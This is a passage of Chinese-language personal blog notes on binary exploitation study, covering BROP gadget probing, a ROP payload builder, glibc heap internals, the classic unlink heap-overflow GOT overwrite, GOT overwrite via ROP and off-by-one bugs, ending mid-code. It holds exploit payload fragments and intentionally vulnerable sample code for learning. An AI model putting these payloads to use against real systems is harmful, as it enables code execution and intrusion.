<p>在HCTF2016的BROP题目Flappy Pig的<a href="http://bobao.360.cn/ctf/detail/179.html" target="_blank" rel="external">wp</a>里学到,如何找到这个<code>pop rdi; ret</code><br>原题目是没有给binary的,爆破先找到一个能够不报错的返回地址下面称为safe_addr<br>然后wp里写道,如果找到这样子一个addr满足下面条件<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Payload1 = <span class="string">'a'</span>*<span class="number">72</span> + l64(addr<span class="number">-1</span>)+l64(<span class="number">0</span>)+l64(safe_addr) <span class="comment"># pop r15; ret</span></div><div class="line">Payload2 = <span class="string">'a'</span>*<span class="number">72</span> + l64(addr)+l64(<span class="number">0</span>)+l64(safe_addr) <span class="comment"># pop rdi; ret</span></div><div class="line">Payload3 = <span class="string">'a'</span>*<span class="number">72</span> + l64(addr+<span class="number">1</span>) +l64(safe_addr) <span class="comment"># ret</span></div></pre></td></tr></table></figure></p>
<p>那么这个addr就是我们要找到的<code>pop rdi; ret</code><br>并且这题wp写的很赞<br>dump内存用puts就可以了,也可以write是嘛</p>
<p>另外关于BROP可以看看<a href="http://blog.csdn.net/qq_32400847/article/details/71190093" target="_blank" rel="external">这个</a>,真的真的perfect</p>
<p>关于这个通用gadgets,在lctf 2016的wp里找到了这个记下来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">com_gadget</span><span class="params">(part1, part2, jmp2, arg1 = <span class="number">0x0</span>, arg2 = <span class="number">0x0</span>, arg3 = <span class="number">0x0</span>)</span>:</span></div><div class="line">    payload  = p64(part1)   <span class="comment"># part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret</span></div><div class="line">    payload += p64(<span class="number">0x0</span>)     <span class="comment"># rbx be 0x0</span></div><div class="line">    payload += p64(<span class="number">0x1</span>)     <span class="comment"># rbp be 0x1</span></div><div class="line">    payload += p64(jmp2)    <span class="comment"># r12 jump to</span></div><div class="line">    payload += p64(arg3)    <span class="comment"># r13 -&gt; rdx    arg3</span></div><div class="line">    payload += p64(arg2)    <span class="comment"># r14 -&gt; rsi    arg2</span></div><div class="line">    payload += p64(arg1)    <span class="comment"># r15 -&gt; edi    arg1</span></div><div class="line">    payload += p64(part2)   <span class="comment"># part2 entry will call [rbx + r12 + 0x8]</span></div><div class="line">    payload += <span class="string">'A'</span> * <span class="number">56</span>     <span class="comment"># junk</span></div><div class="line">    <span class="keyword">return</span> payload</div></pre></td></tr></table></figure>
<p>另外这个gadget其实<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/<span class="number">8</span>i <span class="number">0x000000000040075c</span></div><div class="line">   <span class="number">0x40075c</span>:	pop    r12</div><div class="line">   <span class="number">0x40075e</span>:	pop    r13</div><div class="line">   <span class="number">0x400760</span>:	pop    r14</div><div class="line">   <span class="number">0x400762</span>:	pop    r15</div><div class="line">   <span class="number">0x400764</span>:	ret</div></pre></td></tr></table></figure></p>
<p>在这里偏移一个字节就会变成,控制rsp改变栈顶,但感觉比较危险<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/<span class="number">8</span>i <span class="number">0x000000000040075d</span></div><div class="line">   <span class="number">0x40075d</span>:	pop    rsp</div><div class="line">   <span class="number">0x40075e</span>:	pop    r13</div><div class="line">   <span class="number">0x400760</span>:	pop    r14</div><div class="line">   <span class="number">0x400762</span>:	pop    r15</div><div class="line">   <span class="number">0x400764</span>:	ret</div></pre></td></tr></table></figure></p>
<p>同样r13~r15往下偏移分别能得到rbp, rsi, rdi</p>
<p>这个利用方法,,,今天才看到<a href="http://www.cnblogs.com/Ox9A82/p/5487725.html" target="_blank" rel="external">这篇文章</a><br>原来是这样子…..wopu</p>
<h2 id="没有给lic的时候"><a href="#没有给lic的时候" class="headerlink" title="没有给lic的时候"></a>没有给lic的时候</h2><ol>
<li>用DynELF</li>
<li>在<a href="http://www.cnblogs.com/0xJDchen/p/6175651.html" target="_blank" rel="external">这篇文章</a>里看到可以使用这个叫做libc-database的方法<br>工具在<a href="https://github.com/niklasb/libc-database" target="_blank" rel="external">这里</a>,里面提到<blockquote>
<p>Only the last 12 bits are checked, because randomization usually works on page size level<br>我试了下好像,,,果然是这样子,低位确实是不变的</p>
</blockquote>
</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[关于堆]]></title>
      <url>/2017/07/25/%E5%85%B3%E4%BA%8E%E5%A0%86/</url>
      <content type="html"><![CDATA[<h2 id="前面"><a href="#前面" class="headerlink" title="前面"></a>前面</h2><p>网上一个博主说感觉Linux下堆内存分配不如windows下安全<br>这篇主要是参考自Sploitfun的<a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/" target="_blank" rel="external">blog</a>,然后才发现网络上好多堆相关的文章配图都来自这里</p>
<h2 id="前面-1"><a href="#前面-1" class="headerlink" title="前面"></a>前面</h2><p>Glibc使用的是<code>ptmalloc2</code>,是<code>fork</code>自<code>dlmalloc</code><br>malloc底层其实是调用了<code>brk</code>或者<code>mmap</code></p>
<h2 id="emmmm"><a href="#emmmm" class="headerlink" title="emmmm"></a>emmmm</h2><p>作者写太好了,翻译不出来,看英文好了</p>
<h3 id="allocated-chunk"><a href="#allocated-chunk" class="headerlink" title="allocated chunk"></a>allocated chunk</h3><p>没有fd,bk…本来应该放这些指针的空间现在用来存储数据<br><code>previous size</code>这个字段,如果previous的块是空闲的,那么这个字段确实存储的是<code>previous size</code>,否则,这一块也丢给上一个块存数据…这样子听起来好像把这个字段送给别人的感觉,ahhhhhh~<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">+---------------+ ==</div><div class="line">previous size   + |</div><div class="line">+---------------+ |</div><div class="line">size | N | M |P + |  chunk[xxx]</div><div class="line">+---------------+ |</div><div class="line">User data       + |</div><div class="line">+---------------+ ==</div><div class="line">previous size   + ----&gt; 由于chunk[xxx]以及分配,这个也存放`chuck[xxx]`的User data</div><div class="line">----------------+ |</div><div class="line">......</div></pre></td></tr></table></figure></p>
<p>我有一个问题,就是…我们在malloc的时候给的一个size,到这里指的是,上图的<code>User data</code>,还是<code>User Data</code>加上下一块的这个<code>previous size</code><br>感觉应该是不算???</p>
<h3 id="Free-chunk"><a href="#Free-chunk" class="headerlink" title="Free chunk"></a>Free chunk</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">+---------------+ ====</div><div class="line">previous size --+------&gt; 因为空闲块都会合并,前面的块一定是allocated的,这里存的就是User data</div><div class="line">+---------------+ |</div><div class="line">size | N | M |P + |  chunk[xxx]</div><div class="line">+---------------+ |</div><div class="line">fd ---------------+---&gt; to next chunk [Free]</div><div class="line">bk ---------------+---&gt; to previous chunk [Free]</div><div class="line">User data       + |</div><div class="line">+---------------+ ====</div><div class="line">previous size   + -----&gt; 因为chunk[xxx]是Free的,所以这里存的就是previous size</div><div class="line">----------------+ |</div><div class="line">......</div></pre></td></tr></table></figure>
<p>所有的free的chunk会串联成一串就是叫做<code>bins list</code></p>
<p>所这样子看起来,正常情况,只有一种<code>previous size</code> 的用途不确定(可能不适用于Fast bin???)</p>
<table>
<thead>
<tr>
<th>当前块</th>
<th>当前块previous</th>
<th>下一块previous</th>
</tr>
</thead>
<tbody>
<tr>
<td>allocated</td>
<td>未知</td>
<td>存上一块data</td>
</tr>
<tr>
<td>free</td>
<td>存上一块Data</td>
<td>存previous size</td>
</tr>
</tbody>
</table>
<h2 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h2><p>根据chunk大小分为</p>
<h3 id="Fast-bin"><a href="#Fast-bin" class="headerlink" title="Fast bin"></a>Fast bin</h3><p>大小: 16 - 80字节<br>数量: 10101010101010101010<br>特点: 每个中存储的是单向链表, 并且链上的chunk是LIFO的</p>
<h3 id="其他-bin"><a href="#其他-bin" class="headerlink" title="其他 bin"></a>其他 bin</h3><p>这其他的都是双向链表,所以每一表项有fd,bk两项<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></div><div class="line"><span class="keyword">void</span> * fd;</div><div class="line"><span class="keyword">void</span> * bk</div><div class="line">&#125;bins[]</div></pre></td></tr></table></figure></p>
<h4 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h4><p>大小: 任意<br>数量: 1 (Bin1)<br>特点: Small chunck, Large chunck被Free掉的时候,就来到了这里,这样子就可以用两次再回到原表里</p>
<h4 id="Small-bin"><a href="#Small-bin" class="headerlink" title="Small bin"></a>Small bin</h4><p>大小: 小于512字节<br>数量: 62 (Bin2~Bin63)<br>特点: 8字节递增</p>
<p>Bin2: 16字节<br>…<br>Bin63: 63 * 8 = 504字节</p>
<h4 id="Large-bin"><a href="#Large-bin" class="headerlink" title="Large bin"></a>Large bin</h4><p>大小: 大于等于512字节<br>数量: 63<br>特点: 比较迷乱,看下面</p>
<ul>
<li>32 bins contain binlist of chunks of size which are 64 bytes apart. ie) First large bin (Bin 65) contains binlist of chunks of size 512 bytes to 568 bytes, second large bin (Bin 66) contains binlist of chunks of size 576 bytes to 632 bytes and so on…</li>
<li>16 bins contain binlist of chunks of size which are 512 bytes apart.</li>
<li>8 bins contain binlist of chunks of size which are 4096 bytes apart.</li>
<li>4 bins contain binlist of chunks of size which are 32768 bytes apart.</li>
<li>2 bins contain binlist of chunks of size which are 262144 bytes apart.</li>
<li>1 bin contains a chunk of remaining size.</li>
</ul>
<h3 id="Top-chunck"><a href="#Top-chunck" class="headerlink" title="Top chunck"></a>Top chunck</h3><p>Top chunk 不属于任何bin,找不到任何合适的bin的时候才会使用Top chunk</p>
<h2 id="存储bin的数据结构"><a href="#存储bin的数据结构" class="headerlink" title="存储bin的数据结构"></a>存储bin的数据结构</h2><p>fastbinsY: This array hold fast bins.<br>bins: This array hold unsorted, small and large bins. Totally there are 126 bins and its divided as follows:</p>
<ul>
<li>Bin 1 –&gt; Unsorted bin</li>
<li>Bin 2 to Bin 63 –&gt; Small bin</li>
<li>Bin 64 to Bin 126 –&gt; Large bin</li>
</ul>
<h2 id="Chunk-和-bin-list"><a href="#Chunk-和-bin-list" class="headerlink" title="Chunk 和 bin list"></a>Chunk 和 bin list</h2><p>bin list相当于只是存着指针(或者双向指针)的一个数组,数组中每一项都通过指针把可用的chunk串起来,所以只是表,表,表,那我如何得到bin list的地址呢</p>
<p>chunk是实实际际上可用的内存块,heap区的, 所以地址可能是<code>0x080xxxxx</code>,malloc的返回值就是某一块chunk的user data的首地址,不包括chunck头部的哦</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>来自原作者blog<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* </span></div><div class="line"><span class="comment"> Heap overflow vulnerable program. </span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[] )</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        <span class="keyword">char</span> * first, * second;</div><div class="line"></div><div class="line"><span class="comment">/*[1]*/</span> first = <span class="built_in">malloc</span>( <span class="number">666</span> );</div><div class="line"><span class="comment">/*[2]*/</span> second = <span class="built_in">malloc</span>( <span class="number">12</span> );</div><div class="line">        <span class="keyword">if</span>(argc!=<span class="number">1</span>)</div><div class="line"><span class="comment">/*[3]*/</span>         <span class="built_in">strcpy</span>( first, argv[<span class="number">1</span>] );</div><div class="line"><span class="comment">/*[4]*/</span> <span class="built_in">free</span>( first );</div><div class="line"><span class="comment">/*[5]*/</span> <span class="built_in">free</span>( second );</div><div class="line"><span class="comment">/*[6]*/</span> <span class="keyword">return</span>( <span class="number">0</span> );</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>我们执行过[1], [2]两句,看一下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ p first</div><div class="line">$<span class="number">2</span> = <span class="number">0x804b008</span> <span class="string">""</span></div><div class="line">gdb-peda$ p second</div><div class="line">$<span class="number">3</span> = <span class="number">0x804b2a8</span> <span class="string">""</span></div><div class="line"></div><div class="line">gdb-peda$ x/<span class="number">20</span>x <span class="number">0x804b2a8</span> - <span class="number">0x08</span></div><div class="line"><span class="number">0x804b2a0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000011</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></div><div class="line"><span class="number">0x804b2b0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00020d51</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></div><div class="line"><span class="number">0x804b2c0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></div><div class="line"><span class="number">0x804b2d0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></div><div class="line"><span class="number">0x804b2e0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></div><div class="line">gdb-peda$ x/<span class="number">20</span>x <span class="number">0x804b008</span> - <span class="number">0x08</span></div><div class="line"><span class="number">0x804b000</span>:	<span class="number">0x00000000</span>	<span class="number">0x000002a1</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></div><div class="line"><span class="number">0x804b010</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></div><div class="line"><span class="number">0x804b020</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></div><div class="line"><span class="number">0x804b030</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></div><div class="line"><span class="number">0x804b040</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></div></pre></td></tr></table></figure></p>
<p>我们<code>-0x08</code>是为了看到他chunk的头部<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">+-------------+</div><div class="line">Top chunk</div><div class="line">+-------------+</div><div class="line">size=0x20d51</div><div class="line">+-------------+ </div><div class="line">previous size</div><div class="line">+-------------+ </div><div class="line">second chunk</div><div class="line">+-------------+ 0x804b2a8 ------+</div><div class="line">size=0x11                       |</div><div class="line">+-------------+ 0x804b2a4       |</div><div class="line">previous size                   |=&gt; 0x2a0个字节</div><div class="line">+-------------+ 0x804b2a0       |</div><div class="line">First chunck                    |</div><div class="line">+-------------+ 0x804b008 ------+</div><div class="line">size=0x2a1</div><div class="line">+-------------+ 0x804b004</div><div class="line">previous size</div><div class="line">+-------------+ 0x804b000</div></pre></td></tr></table></figure></p>
<p>first chunk在malloc的时候给的参数是666,这里first chunk的size是<br>0x2a1 = 673  为什么是这样子???<br>智障了吧,最后三位是0 or 1不代表大小<br>后三位是没有意义的,他会8字节对齐,最后三位用于标志位<br>0x2a1 = 0000 0010 1010 0<code>001</code><br>所以这里代表的大小是 666 对于 8 向上对齐,就是 672 / 8 = 84<br>所以First Chunk是从 0x804b200 ~ 0x804b2a8 这672字节</p>
<p>这样子的话是不是说Heap最低地址一般都是 0x804x000<br>然后<code>size + previous size</code> 是 8字节<br>这样子正好chunk的User data开始的地址也是对齐的<br>是这个意思吗</p>
<p>同理,second chunk大小是12也不能对齐8,所以对齐到了16(0x10),又由于second的前一块,即first chunk也被allocate出去了,所以标志位最后一位是1,所以,内存中second chunk的大小是0x11 = 0000 0000 0001 0<code>001</code></p>
<p>不过有点不太对劲啊,难道…这0x2a0个字节只是说了这一块User data到下一块User data之间的距离,已经把人家下一块的<code>size + previous</code>也算进去了???</p>
<p>也就是说计算的时候,对应的项差size个字节是这个意思吗???<br>就是<br>chunk[1].size == chunk[2].data_offset - chunk[1].data_offset<br>chunk[1].size == chunk[2].size_offset - chunk[1].size_offset<br>…</p>
<p>那我们验证一下,second chunk的size在0x804b2a4,大小为0x10,那0x804b2b4 = 0x804b2a4 + 0x10存的应该是op chunk的大小</p>
<p>喔,,,果然是这样子<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x <span class="number">0x804b004</span></div><div class="line"><span class="number">0x804b004</span>:	<span class="number">0x000002a1</span>   <span class="comment">// first chunk'size</span></div><div class="line">gdb-peda$ x <span class="number">0x804b004</span> + <span class="number">0x000002a0</span></div><div class="line"><span class="number">0x804b2a4</span>:	<span class="number">0x00000011</span>  <span class="comment">// second chunk'size</span></div><div class="line">gdb-peda$ x <span class="number">0x804b2a4</span> + <span class="number">0x00000010</span></div><div class="line"><span class="number">0x804b2b4</span>:	<span class="number">0x00020d51</span>  <span class="comment">// Top chunk'size</span></div></pre></td></tr></table></figure></p>
<p>所以在[4], free掉Fisrt chunk的时候<br>检查前一块是否使用<br>通过自己的size = 0x2a1, 最后一位是1, 所以前一块不空闲(这里first chunk是第一块,他其实是没有前一块,但应该为了统一,假设第一块前面那一块不存在的块是在使用的块,就不能合并了)</p>
<p>检查后一块是否使用<br>检查后一块就是检查second块,可以通过second的下一块即Top chunk的size字段最后一位,即0x00020d51的最后一位标志的top的前一块也就是second正在使用,所以不能合并</p>
<p>这里都不是空闲的,如果是空闲的话,就会触发binlist的unlink操作,就是把被合并的块从binlist里卸下来</p>
<p>而如果我们在[3]里的strcpy的时候,进行了奇怪的操作,就是不光写了first chunk的data部分,还写了second chunk的头部<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">prev_size = even number <span class="keyword">and</span> hence PREV_INUSE bit is unset.</div><div class="line">size = <span class="number">-4</span></div><div class="line">fd = <span class="built_in">free</span> address – <span class="number">12</span></div><div class="line">bk = shellcode address</div></pre></td></tr></table></figure></p>
<p>那么在[4], free掉First chunk的时候,<br>检查前一块是否使用<br>通过自己的size = 0x2a1, 最后一位是1, 所以前一块不空闲</p>
<p>检查后一块是否使用<br>检查后一块就是检查second块,可以通过second的下一块的size字段来看,上面刚说到这个下一块的size字段,其实就是用second的size字段的位置加上second的size字段,放在这里就是,往回数4个字节,正好到了sedond chunk的previous size这里,而这里被我们改写成了偶数,这个时候malloc就会认为我们的second是free的,就会把他从bin list上取下来,准备合并</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">+-------------+ 高地址</div><div class="line">Top chunk</div><div class="line">+-------------+</div><div class="line">size=0x20d51</div><div class="line">+-------------+ </div><div class="line">previous size</div><div class="line">+-------------+ </div><div class="line">second chunk</div><div class="line">bk -------------&gt; addr_free - 12</div><div class="line">fd -------------&gt; addr_shellcode</div><div class="line">+-------------+ </div><div class="line">size= -4</div><div class="line">+-------------+ &lt;--- size_of_second</div><div class="line">previous size =&gt;&gt;&gt;&gt; 覆盖成偶数</div><div class="line">+-------------+ &lt;--addr_size_of_second + size_of_second</div></pre></td></tr></table></figure>
<p>在unlink掉second时候,会将second的fd和bk字段赋值给FD和BK变量,还有,还有看代码吧<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;                                            \</span></div><div class="line">    FD = P-&gt;fd;								      \</div><div class="line">    BK = P-&gt;bk;								      \</div><div class="line">    FD-&gt;bk = BK;							      \</div><div class="line">    BK-&gt;fd = FD;							      \</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在我们这里是<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">FD = addr_free - <span class="number">12</span>;</div><div class="line">BK = addr_shellcode; </div><div class="line">FD -&gt; bk = addr_shellcode; <span class="comment">//GOT[free] = addr_shellcode, 到此就完成了GOT overwrite</span></div><div class="line">BK -&gt; fd = FD;  <span class="comment">// (shellcode + 8) = addr_free - 12</span></div></pre></td></tr></table></figure></p>
<p>这里的addr_free就是GOT[free],我们的FD是addr_GOT[free]-12,对吧,这里的12怎么来的就是看第三句,我们要<code>FD -&gt; bk</code>, 我们看下,对于一个块,他的bk指针是偏移12字节的,前面有<code>prev_size</code>, <code>size</code>和<code>fd</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></div><div class="line">dword prev_size;</div><div class="line">dword size;</div><div class="line">bin * fd;</div><div class="line">bin * bk;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<blockquote>
<p>结论:这链表链着的是块头部,从prev_size开始的<br>炒鸡注意:这里第四句会把shellcode的第8-11这四个字节给破坏掉</p>
</blockquote>
<p>这里就是整个比较老的glibc的攻击思路</p>
<p>前面的我们搞清楚了</p>
<p>但.新的glibc加了一些防护功能<br>见wooyun这一篇 <a href="http://www.tuicool.com/articles/E3Ezu2u" target="_blank" rel="external">http://www.tuicool.com/articles/E3Ezu2u</a></p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[GOT overwitre & GOT dereference]]></title>
      <url>/2017/07/24/GOT-overwitre-GOT-dereference/</url>
      <content type="html"><![CDATA[<p>还是来自<code>sploitfun</code>的blog,绕过地址随机化之三</p>
<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="GOT-overwitre"><a href="#GOT-overwitre" class="headerlink" title="GOT overwitre"></a>GOT overwitre</h3><p>其实就是我们常说的GOT表覆写,这个got表的地址是早已经确定的,但got表的内容<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">offset_diff = execve_addr - getuid_addr</div><div class="line">GOT[getuid] = GOT[getuid] + offset_diff</div></pre></td></tr></table></figure></p>
<p>其实<code>ret2dl-resolve</code>是不是有类似的地方</p>
<h3 id="GOT-dereference"><a href="#GOT-dereference" class="headerlink" title="GOT dereference"></a>GOT dereference</h3><p>这个没有使用过<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">offset_diff = execve_addr - getuid_addr</div><div class="line">eax = GOT[getuid]</div><div class="line">eax = eax + offset_diff</div></pre></td></tr></table></figure></p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>是用ROP咯</p>
<h3 id="GOT-overwitre-1"><a href="#GOT-overwitre-1" class="headerlink" title="GOT overwitre"></a>GOT overwitre</h3><p>作者找到了几个gadget<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># gadget1</div><div class="line">add eax, [ebx + 0x5d5b04c4]</div><div class="line">ret</div></pre></td></tr></table></figure></p>
<p>这样子让<code>$eax = offset</code>并且<code>$ebx = got[uid] -0x5d5b04c4</code>就阔以啦<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># gadget2</div><div class="line">pop ebx</div><div class="line">ret</div></pre></td></tr></table></figure></p>
<p>我们先把所要的值搞到栈里,然后调到这里来完成给ebx的赋值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># gadget3</div><div class="line">pop eax</div><div class="line">ret</div></pre></td></tr></table></figure></p>
<p>emmmmm~,这样子就阔以了,然后作者说找不到这个gadget3</p>
<h3 id="GOT-dereference-1"><a href="#GOT-dereference-1" class="headerlink" title="GOT dereference"></a>GOT dereference</h3><h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><p>原文中提到了<code>stack pivot</code>,利用<code>leave</code>来实现,因为<code>leave</code>其实相当于可以控制<code>esp</code>,所以相当于可以自定义栈地址<br>所以只需要改掉<code>ebp</code>,然后跳到<code>leave; ret</code></p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SploitFun off-by-one]]></title>
      <url>/2017/07/24/SploitFun-off-by-one/</url>
      <content type="html"><![CDATA[<p>跟着<code>SploitFun</code>大佬的blog学习pwn<br>第一节是普通的栈溢出,第二节是整数溢出</p>
<p>现在看的是第三节<code>off-by-one</code></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><code>off-by-one</code>,one是一个字节,就是一个字节的溢出<br>比如<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">char</span> vuln_s[<span class="number">5</span>];</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++) &#123;</div><div class="line">        vuln_s[i] = ...;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>缓冲区只有5个字节的大小,我们却赋值了六次,这个第六次就看会覆盖到缓冲区上面的位置,通常是<code>ebp</code>的最低字节</p>
<h2 id="代码及分析"><a href="#代码及分析" class="headerlink" title="代码及分析"></a>代码及分析</h2><p>大佬的blog讲的是最基础的栈上的off-by-one的一个例子,网上还有大佬写过一个堆上off-by-one的<a href="http://bobao.360.cn/learning/detail/3113.html" target="_blank" rel="external">文章</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 